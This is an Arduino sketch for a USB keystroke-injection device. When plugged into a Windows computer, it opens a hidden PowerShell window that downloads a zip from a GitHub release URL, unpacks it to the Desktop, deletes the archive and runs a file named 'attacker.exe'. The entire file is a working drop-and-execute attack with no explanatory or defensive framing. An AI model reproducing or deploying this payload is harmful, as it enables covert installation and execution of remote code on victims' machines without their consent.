#include <Arduino.h>
#include <Keyboard.h>

void setup() {
  delay(500);
  Keyboard.begin();

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("powershell");
	Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(3000);

	String zip = "$env:TEMP\\test.zip";
	String dest = "$env:USERPROFILE\\Desktop";
	String c1 = "Invoke-WebRequest -Uri https://github.com/Fede-ai/Controller/releases/download/v0.0.0-alpha/test.zip -OutFile " + zip + ";";
	String c2 = "Expand-Archive -Path " + zip + " -DestinationPath " + dest + " -Force;";
	String c3 = "Remove-Item " + zip + ";";
	String c4 = "Start-Process -FilePath (Join-Path " + dest + " 'test\\attacker.exe');";

  Keyboard.print("powershell -w hidden -c \"" + c1 + c2 + c3 + c4 + "\";exit;");
	Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {
	delay(1000);
}
